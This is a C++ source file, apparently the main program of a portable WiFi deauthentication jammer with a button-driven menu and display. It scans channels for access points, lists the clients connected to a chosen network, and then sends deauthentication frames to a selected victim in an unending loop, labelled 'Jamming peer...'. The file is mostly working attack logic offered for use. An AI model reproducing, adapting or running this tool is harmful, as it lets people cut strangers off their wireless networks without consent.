#include "main.h"
#include "channel.h"
#include "ieee80211.h"
#include "gpio.h"
#include "display.h"
#include "ui_menus.h"
#include <math.h>

#define PEER_SCAN_WAIT 1e+7

using namespace std;

std::map <std::string, Station *> Globals::stations;
Display *Globals::display;
Oui * Globals::oui;

Channel *channel;

pcap_t *Globals::pcap_descr = (pcap_t *)NULL;

void *cycle_channels(void *_v) {
    display->cursor->print("Scanning...", true);
    display->update();
    
    for (int i = 1; i != 15; i++) {
        if (channel->set_channel(i))
            cout << "Failed to set channel\n";
        char ch_str[9];
        snprintf(
            ch_str, 8, "%dMHz",
            ieee80211_channel_to_frequency(channel->get_channel())
        );
        
        display->cursor->set(0, 1);
        display->cursor->print("Frequency:", false);
        display->cursor->print((const char *)ch_str, false);
        display->update();
        
        for (int ii = 0; ii != 3; ii++) {
            send_probe(Globals::pcap_descr);
            usleep(10000);
        }
        
        usleep(SCAN_INTERVAL * 2000);
    }

    pthread_exit(NULL);
}

void *scan_aps(void *udata) {
    if (pcap_loop(Globals::pcap_descr, 0, ap_scan_handler, (u_char *)NULL) == -1) {
        cout << "pcap_loop() failed: " << pcap_geterr(Globals::pcap_descr);
    }
}

void *scan_peers(void *udata) {
    if (pcap_loop(Globals::pcap_descr, 0, peer_scan_handler, (u_char *)udata) == -1) {
        cout << "pcap_loop() failed: " << pcap_geterr(Globals::pcap_descr);
    }
}

void *deauth_peer(void *udata) {
    Peer *peer = (Peer *)udata;
    
    uint8_t *victim = peer->mac_addr;
    uint8_t *station = peer->ap->bssid;
    
    uint8_t seq = 0;
    int ostate;
    
    while (1) {
        pthread_setcancelstate(PTHREAD_CANCEL_DISABLE, &ostate);
        send_deauth(Globals::pcap_descr, victim, station, false, seq);
        pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &ostate);
        
        usleep(2000);
        
        pthread_setcancelstate(PTHREAD_CANCEL_DISABLE, &ostate);
        send_deauth(Globals::pcap_descr, victim, station, true, seq);
        pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &ostate);
        
        usleep(2000);
        seq++;
    }
}

void init_keyboard() {
    init_gpio();
    
    setup_gpio(L_pin, 1, PUD_UP);
    setup_gpio(U_pin, 1, PUD_UP);
    setup_gpio(R_pin, 1, PUD_UP);
    setup_gpio(D_pin, 1, PUD_UP);
    setup_gpio(C_pin, 1, PUD_UP);
    setup_gpio(A_pin, 1, PUD_UP);
    setup_gpio(B_pin, 1, PUD_UP);
}

int main() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pthread_t channel_thread;
    pthread_t scan_thread;
    void *res;
    
    display = new Display;
    channel = new Channel;

    Globals::oui = new Oui;
    Globals::oui->load();
    
    init_keyboard();

    root_menu:
        RootMenu rootmenu(display);

        int selected;
        rootmenu.get_selection(selected);

        if (selected == 1) {
            delete display;
            system("shutdown -h now");

            return 0;
        }

        display->clear();

        Globals::pcap_descr = pcap_open_live(WDEV, BUFSIZ, 0, SCAN_INTERVAL, errbuf);
        if (Globals::pcap_descr == NULL) {
            cout << "pcap_open_live() failed: " << errbuf << endl;
            return 1;
        }

        pthread_create(&scan_thread, NULL, scan_aps, NULL);
        pthread_create(&channel_thread, NULL, cycle_channels, NULL);

        pthread_join(channel_thread, &res);
        pthread_cancel(scan_thread);

        pcap_close(Globals::pcap_descr);
    
    station_menu:
        Station *selected_station;
        StationMenu stationmenu(display);
        selected_station = stationmenu.get_station();
        
        if (selected_station == (Station *)NULL)
            goto root_menu;

        display->clear();
        display->cursor->print("Scanning for peers...", false);
        display->update();

        channel->set_channel(selected_station->channel);
        
        Globals::pcap_descr = pcap_open_live(WDEV, BUFSIZ, 0, SCAN_INTERVAL, errbuf);
        
        pthread_create(
            &scan_thread, NULL, scan_peers,
            selected_station
        );

        usleep(PEER_SCAN_WAIT);
        pthread_cancel(scan_thread);
        pthread_join(scan_thread, &res);
        pcap_close(Globals::pcap_descr);
    
    peer_menu:    
        PeerMenu peer_menu(display, selected_station->peers);
        Peer *selected_peer = peer_menu.get_peer();
        
        if (selected_peer == (Peer *)NULL)
            goto station_menu;
        
        Globals::pcap_descr = pcap_open_live(WDEV, BUFSIZ, 0, SCAN_INTERVAL, errbuf);
        pthread_create(
            &scan_thread, NULL, deauth_peer,
            selected_peer
        );

        display->clear();
        display->cursor->print("Jamming peer...", false);
        display->update();
        
        while (1) {
            if (!input_gpio(A_pin) || !input_gpio(B_pin)) {
                break;
            }
            
            usleep(10000);
        }

        pthread_cancel(scan_thread);
        pthread_join(scan_thread, &res);
        pcap_close(Globals::pcap_descr);
        
        goto root_menu;

    delete channel;

    return 0;
}
